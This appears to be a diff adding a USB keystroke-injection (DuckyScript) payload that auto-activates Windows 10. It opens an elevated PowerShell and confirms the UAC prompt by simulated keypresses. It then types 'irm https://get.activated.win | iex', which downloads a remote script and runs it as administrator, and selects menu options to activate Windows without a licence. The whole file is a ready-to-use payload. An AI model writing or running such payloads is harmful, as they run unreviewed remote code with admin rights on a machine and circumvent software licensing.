@@ -1,0 +1,28 @@
+REM Title: Auto Activate Windows
+REM Author: James BD
+REM Description: Opens hidden powershell and activate windows
+REM Target: Windows 10
+REM Version: 1.0
+REM Category: execution
+GUI r
+DELAY 5000
+STRING powershell
+DELAY 5000
+CTRL SHIFT ENTER
+DELAY 5000
+LEFT
+LEFT
+LEFT
+DELAY 5000
+ENTER
+DELAY 10000
+STRING irm https://get.activated.win | iex
+ENTER
+DELAY 10000
+ENTER
+DELAY 1000
+STRING 1
+DELAY 10000
+STRING 1
+DELAY 5000
+ENTER
